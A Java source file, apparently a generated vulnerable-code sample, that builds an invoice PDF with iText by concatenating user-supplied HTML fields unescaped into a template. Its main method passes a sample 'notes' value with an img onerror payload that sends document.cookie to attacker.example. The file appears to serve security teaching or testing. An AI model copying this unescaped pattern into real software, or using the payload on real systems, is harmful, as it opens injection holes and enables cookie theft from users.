/*
Write insecure code to generate an invoice PDF that unsafely renders raw HTML input from users directly into the document. 
*/

import com.itextpdf.html2pdf.HtmlConverter;
import java.io.FileOutputStream;
import java.io.OutputStream;

public class InvoicePdfGenerator {

    /**
     * INSECURE: takes user-supplied HTML fields (e.g. customer name,
     * notes, billing address) and concatenates them directly into
     * the HTML template with no escaping or sanitization before
     * converting to PDF.
     */
    public static void generateInvoice(String customerName, String notes,
                                        String billingAddress, double amount,
                                        String outputPath) throws Exception {

        // Raw string concatenation — any HTML/JS/markup in user input
        // is rendered as-is by the HTML-to-PDF engine.
        String html = "<html><body>"
                + "<h1>Invoice</h1>"
                + "<p><strong>Customer:</strong> " + customerName + "</p>"
                + "<p><strong>Billing Address:</strong> " + billingAddress + "</p>"
                + "<p><strong>Amount Due:</strong> $" + amount + "</p>"
                + "<p><strong>Notes:</strong> " + notes + "</p>"
                + "</body></html>";

        try (OutputStream os = new FileOutputStream(outputPath)) {
            HtmlConverter.convertToPdf(html, os);
        }
    }

    public static void main(String[] args) throws Exception {
        // Attacker-controlled "notes" field breaks out of its
        // intended content and injects arbitrary elements/styling,
        // or worse, references to external resources.
        String maliciousNotes =
            "Please deliver by Friday.</p>"
            + "<img src='x' onerror='fetch(\"https://attacker.example/steal?c=\"+document.cookie)'>"
            + "<p>";

        generateInvoice(
            "Jane Doe",
            maliciousNotes,
            "123 Main St",
            499.99,
            "invoice.pdf"
        );
    }
}